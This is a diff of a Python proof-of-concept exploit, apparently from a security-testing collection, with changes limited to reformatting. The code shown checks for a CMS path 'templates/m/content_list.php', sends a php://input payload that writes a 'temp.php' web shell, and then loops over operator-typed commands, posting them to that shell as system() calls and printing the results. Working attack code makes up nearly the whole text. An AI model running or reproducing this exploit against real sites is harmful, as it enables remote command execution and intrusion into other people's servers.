@@ -5,7 +5,9 @@ import requests
 def poc():
     try:
         if not target.url.endswith("templates/m/content_list.php"):
-            print("[*] Please make sure the url end with 'templates/m/content_list.php'")
+            print(
+                "[*] Please make sure the url end with 'templates/m/content_list.php'"
+            )
             exit()
 
         payload = "?session=kejishidai&url=php://input&cms=temp.php"
@@ -26,9 +28,7 @@ def poc():
                 command = raw_input("[*] input the command:")
                 payload = 'system("%s");' % command
                 if command != "exit":
-                    postData = {
-                        password: payload
-                    }
+                    postData = {password: payload}
                     r = requests.post(shell, data=postData)
                     print(r.text.encode(r.encoding))
                 else:
@@ -36,6 +36,7 @@ def poc():
             except EOFError as e:
                 print("[*] type 'exit' to quit")
                 pass
-        print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))
     except (KeyError, AttributeError) as e:
-        print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
+        print(
+            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
+        )
